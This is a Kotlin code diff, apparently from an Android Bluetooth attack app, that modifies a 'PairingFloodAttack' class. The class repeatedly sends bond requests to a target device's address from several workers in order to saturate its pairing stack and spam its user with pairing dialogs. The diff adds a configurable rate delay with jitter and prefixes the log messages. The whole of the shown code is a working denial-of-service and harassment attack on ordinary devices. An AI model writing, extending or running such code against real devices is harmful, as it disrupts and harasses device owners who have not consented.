@@ -16,7 +16,11 @@ import kotlinx.coroutines.launch
  * Pairing Flood: sends a continuous stream of bond requests to the target.
  * Saturation of the pairing path + UI dialog spam when the user confirms.
  */
-class PairingFloodAttack(private val targetAddress: String, private val threads: Int = 8) : BluetoothAttack {
+class PairingFloodAttack(
+    private val targetAddress: String,
+    private val threads: Int = 8,
+    private val rateDelayMs: Int = 0
+) : BluetoothAttack {
 
     override val displayName = AttackType.PAIRING_FLOOD.displayName
     override val description = AttackType.PAIRING_FLOOD.description
@@ -46,20 +50,22 @@ class PairingFloodAttack(private val targetAddress: String, private val threads:
         // The stack serializes bond requests; more than 3 workers adds nothing.
         val concurrency = threads.coerceIn(1, 3)
         scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
-        onLog("Pairing Flood iniciado (objetivo $targetAddress, $concurrency worker(s))")
+        onLog("[PAIR] Pairing Flood iniciado (objetivo $targetAddress, $concurrency worker(s))")
         for (worker in 0 until concurrency) {
             scope!!.launch {
                 var attempts = 0
+                var round = 0
                 while (isActive && running) {
                     val ok = try {
                         device.createBond()
                     } catch (e: SecurityException) {
                         false
                     }
-                    if (ok) onLog("Solicitud de emparejamiento enviada (worker $worker)")
+                    if (ok) onLog("[PAIR] Solicitud de emparejamiento enviada (worker $worker)")
                     attempts++
-                    if (attempts % 10 == 0) onLog("Intentos totales: $attempts")
-                    delay(1200)
+                    if (attempts % 10 == 0) onLog("[PAIR] Intentos totales: $attempts")
+                    round++
+                    jitterDelay(maxOf(1200, rateDelayMs))
                 }
             }
         }
